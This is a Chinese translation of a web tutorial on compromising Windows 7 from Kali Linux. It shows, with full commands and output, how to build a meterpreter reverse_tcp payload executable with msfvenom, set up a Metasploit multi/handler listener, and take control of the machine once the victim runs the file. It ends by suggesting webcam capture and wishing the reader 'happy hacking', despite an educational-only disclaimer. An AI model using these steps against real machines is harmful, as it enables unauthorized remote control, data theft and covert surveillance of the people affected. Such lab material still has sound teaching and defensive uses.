如何使用 Kali Linux 黑掉 Windows
====================

Kali Linux 派生自 Debian Linux，主要用于渗透测试，拥有超过 300 个的预安装好的渗透测试工具。Metasploit 项目中 Metasploit 框架支持 Kali Linux 平台，Metasploit 是一个用于开发和执行安全利用代码（security exploit）的工具。让我们来使用 Kali Linux 来攻破 Windows 吧。请注意，我写这篇文章只是出于教育目的哦——一切因此带来的后果和本文作者、译者无关。

### 源机器详情

Kali Linux

```
root@kali:/# uname -a
Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux
root@kali:/#
```

用做攻击对象的目标机器：

```
Windows 7 Ultimate SP1
```

### 步骤 1：创建 Payload 程序

Payload 是一个类似于病毒或者木马的程序，可以运行在远程目标上 —— 为了黑掉那台机器。可以通过以下命令来创建 Payload（`program.exe`），以便能使用 Kali Linux 黑掉 Windows。

```
root@kali:/# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.128 LPORT=4444 --format=exe -o /root/program.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
Saved as: /root/program.exe
root@kali:/# ls -la /root/program.exe
-rw-r--r-- 1 root root 73802 Jan 26 00:46 /root/program.exe
```

通过 `ls` 命令，我们可以确认 Payload 程序是否成功生成在指定的位置。

### 步骤 2：运行 `mfsconsole` 命令启动 msf 命令窗口

```
root@kali:# msfconsole


                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


Taking notes in notepad? Have Metasploit Pro track & report
your progress and findings -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.12.22-dev                         ]
+ -- --=[ 1577 exploits - 906 auxiliary - 272 post        ]
+ -- --=[ 455 payloads - 39 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf >
```

### 步骤 3：进行漏洞利用的细节

* 4444 端口：你可以按照自己的想法来选择使用哪个端口
* LHOST IP：表示 Kali Linux 机器的 IP，这里是 192.168.189.128。 使用如下命令来查看你的 Kali Linux 机器的 IP。

```
root@kali:/# ip r l
192.168.189.0/24 dev eth0  proto kernel  scope link  src 192.168.189.128  metric 100
root@kali:/#
```

现在在 msf 命令窗口使用 `use exploit/multi/handler` 命令，如下：

```
msf > use exploit/multi/handler
msf exploit(handler) >
```

然后在接下来的命令窗口中使用命令 `set payload windows/meterpreter/reverse_tcp`：

```
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

现在使用 LHOST 和 LPORT 来设置本地 IP 和本地端口，如下：

```
msf exploit(handler) > set lhost 192.168.189.128
lhost => 192.168.189.128
msf exploit(handler) > set lport 4444
lport => 4444
```

最后使用 `exploit` 命令。

```
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.189.128:4444
[*] Starting the payload handler...
```

现在你需要在 Windows 上运行 `program.exe`，一旦它在目标机器上执行，你就可以建立一个 meterpreter 会话。输入 `sysinfo` 就可以得到这台被黑掉的 Windows 机器的详情。

```
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.189.128:4444
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.189.1
[*] Meterpreter session 1 opened (192.168.189.128:4444 -> 192.168.189.1:53091) at 2017-01-26 00:51:31 +0000

meterpreter > sysinfo
Computer        : MANN-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64 (Current Process is WOW64)
System Language : en_IN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
```

一旦你得到了这些详细信息，就可以做更多的漏洞利用，或者通过 `help` 命令获取更多信息，以便列出你可以黑掉该系统的所有选项，比如 `webcam_snap` 命令获取网络摄像头，同样你还可以使用其他更多的可用选项。祝你入侵愉快！！！！ ←_←

------------------------------------

译者简介：

[GHLandy](http://GHLandy.com) —— 划不完粉腮柳眉泣别离。

------------------------------------

via: http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/

作者：[Manmohan Mirkar][a]
译者：[GHLandy](https://github.com/GHLandy)
校对：[wxy](https://github.com/wxy)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创编译，[Linux中国](https://linux.cn/) 荣誉推出

[a]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/
[1]:http://www.linuxroutes.com/author/admin/
[2]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#respond
[3]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[4]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[5]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[6]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[7]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[8]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[9]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[10]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[11]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[12]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[13]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
